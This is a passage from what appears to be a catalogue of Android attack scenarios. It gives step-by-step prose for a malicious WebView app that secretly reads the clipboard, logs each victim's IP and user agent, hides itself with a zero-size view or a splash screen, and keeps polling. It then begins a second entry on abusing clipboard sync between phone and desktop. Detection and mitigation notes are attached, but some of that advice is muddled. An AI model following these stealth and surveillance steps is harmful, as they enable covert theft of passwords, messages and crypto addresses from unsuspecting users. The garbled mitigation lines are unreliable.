clipboard contents. You can also record the device's IP, user-agent, and timestamp for identifying victims and behavior. Step 8: Hide WebView Activity (Optional) – To make the app stealthier, you can use a 0dp height and width WebView or hide it behind a splash screen while it still loads the malicious JavaScript in the background. Optionally delay payload execution using timers. Step 9: Persistently Monitor Clipboard – Use a background service or looped page reloads every few seconds in JavaScript to continuously access clipboard data, especially if the user stays in the app for long (e.g., during quizzes or reading).
- **Detection**: Use dynamic analysis tools (e.g., Frida, Logcat) to detect clipboard access from WebView apps, monitor outbound requests to unknown servers, block WebView JavaScript execution via security software, observe background data use
- **Solution**: Educate users to avoid unknown apps with WebView or browser-like behavior, use Android 10+ devices where clipboard access is restricted, disable third-party keyboards that allow JS clipboard read, monitor clipboard usage with security apps
- **Tags**: #WebViewExploit #ClipboardLeak #AndroidSecurity #WebViewHijack #JavaScriptAbuse #MobileClipboardAttack

## Shared Clipboard Abuse via Sync (e.g., Android–PC)

- **Attack Type**: Clipboard Hijacking → Cross-Device Sync Exploit
- **Target**: Android Phone and Synced Desktop (Windows/Linux/macOS)
- **Vulnerability**: Abuse of Cross-Device Clipboard Sync, Lack of User Awareness, ClipboardManager API, Windows Clipboard API
- **MITRE**: T1056.001 (Input Capture – Clipboard Monitoring), T1021.001 (Remote Services – Desktop Access), T1086 (PowerShell or Script Execution)
- **Impact**: Identity theft, Crypto address replacement, Phishing link injection, Full clipboard surveillance across multiple devices, Sensitive information leakage, Social engineering vector
- **Tools**: Windows PC, Android Device, Microsoft SwiftKey, KDE Connect, Pushbullet, Gboard Clipboard Sync, Wireshark, ADB, Frida, MITMproxy, Python Flask Server, Clipboard Viewers, Termux
- **Scenario**: In this attack, the clipboard sync feature between an Android mobile phone and a desktop (usually Windows PC) is abused to intercept, steal, or manipulate clipboard contents shared across devices. Many modern apps like Microsoft SwiftKey, KDE Connect, Pushbullet, and Google GBoard offer clipboard syncing via Bluetooth, Wi-Fi, or cloud accounts.
